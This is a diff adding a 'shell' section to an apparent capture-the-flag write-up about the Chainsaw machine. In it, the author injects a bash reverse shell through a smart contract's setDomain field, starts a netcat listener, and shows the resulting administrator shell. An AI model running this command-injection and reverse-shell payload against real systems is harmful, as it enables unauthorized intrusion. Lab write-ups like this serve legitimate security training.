@@ -532,6 +532,46 @@ I've broken the responses up to make it more apparent, but as you can see, there
 ### Obtaining A Shell
 
 Now that I have crafted a working payload, I can attempt to obtain a shell given what I already know.
+<p><br></p>
+
+I opted for the "easy" route, and settled with a `bash` reverse shell. I set up a `netcat` listener on port `9001` with this command: 
+
+```python
+nc -lnvp 9001
+```
+
+And then proceeded to obtain a shell on that port with this command in my `python` session:
+
+```python
++>>> contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
+HexBytes('0x956acbf29a79038db60787bed29bcb808f03d68ec1c815852e9f5f88538c3d29')
+```
+
+Et...
+<p><br></p>
+
+```python
+➜  www nc -lnvp 9001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+```
+
+Voilà!
+
+```python
+➜  www nc -lnvp 9001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.142.
+Ncat: Connection from 10.10.10.142:37282.
+bash: cannot set terminal process group (1529): Inappropriate ioctl for device
+bash: no job control in this shell
+administrator@chainsaw:/opt/WeaponizedPing$
+```
+
+I managed to obtain a shell as `administrator`!
 
 ### Writeup still in progress... Check back later for more!
 
